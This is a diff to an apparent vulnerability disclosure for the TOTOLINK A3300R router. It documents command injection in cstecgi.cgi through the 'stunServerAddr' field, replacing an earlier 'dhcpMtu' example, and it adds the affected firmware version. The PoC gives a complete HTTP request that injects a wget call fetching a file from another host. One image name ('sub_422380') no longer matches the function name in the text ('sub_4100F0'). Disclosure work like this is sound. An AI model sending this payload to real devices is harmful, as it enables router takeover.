@@ -4,6 +4,10 @@ Vendor:ToTolink
 
 Product:A3300r
 
+Affected Version: V17.0.0cu.557_B20221024
+
+Firmware Download: https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/241/ids/36.html
+
 Vulnerability: Command Injection
 
 Type:Command Injection Attack
@@ -16,9 +20,9 @@ Type:Command Injection Attack
 We found a command injection vulnerability  in `cstecgi.cgi` that could be triggered by an attacker through carefully crafted packet requests:
 
 
-<div  align="center"><img src="./img/dhcp-mtu-sub_422380.png" style="zoom:80%;" /></div>
+<div  align="center"><img src="./img/stun-server-addr-sub_422380.png" style="zoom:80%;" /></div>
 
-The sub_422380 function defines a variable `dhcpMtu`, retrieves its value from the request  packet, and passes its value to the Uci_Set_Str function.
+The sub_4100F0 function defines a variable `stunServerAddr`, retrieves its value from the request  packet, and passes its value to the Uci_Set_Str function.
 
 <div  align="center"><img src="./img/uci_set_str.png" style="zoom:80%;" /></div>
 
@@ -31,12 +35,12 @@ However,the CsteSystem function wraps the command and then passes it to execv to
 
 ## Proof of Concept (PoC)
 
-We set `dhcpMtu` as **1500$(wget 192.168.6.1:8888/testpoc)** ,such as:
+We set `stunServerAddr` as **192.168.123.234$(wget 192.168.6.1:8888/testpoc)** ,such as:
 
 ```http
 POST /cgi-bin/cstecgi.cgi HTTP/1.1
 Host: 192.168.6.2
-Content-Length: 216
+Content-Length: 248
 X-Requested-With: XMLHttpRequest
 Accept-Language: en-US,en;q=0.9
 Accept: application/json, text/javascript, */*; q=0.01
@@ -47,8 +51,8 @@ Referer: http://192.168.6.2/wizard.html?token=
 Accept-Encoding: gzip, deflate, br
 Connection: keep-alive
 
-{"hostName":"TOTOLINK","dhcpMtu":"1500$(wget 192.168.6.1:8888/testpoc)","proto":1,"dnsMode":"0","ttlWay":"1","lcpEchoEnable":"1","option60Enable":"0","clone":"0","cloneMac":"40:EE:15:D4:88:6D","topicurl":"setWanCfg"}
+{"addEffect":"0","enable":"1","url":"192.168.123.234","user":"123","pass":"123","informEnable":"0","interval":"","stunEnable":"1","stunServerAddr":"192.168.123.234$(wget 192.168.6.1:8888/testpoc)","stunPort":"4343","stunMaxAlive":"3600","stunMinAlive":"30","stun_user":"123","stun_pass":"123","topicurl":"setTr069Cfg"}
 ```
 
 ## outcome
-<div  align="center"><img src="./img/poc-dhcp-mtu.png" style="zoom:80%;" /></div>
+<div  align="center"><img src="./img/poc-stun-server-addr.png" style="zoom:80%;" /></div>
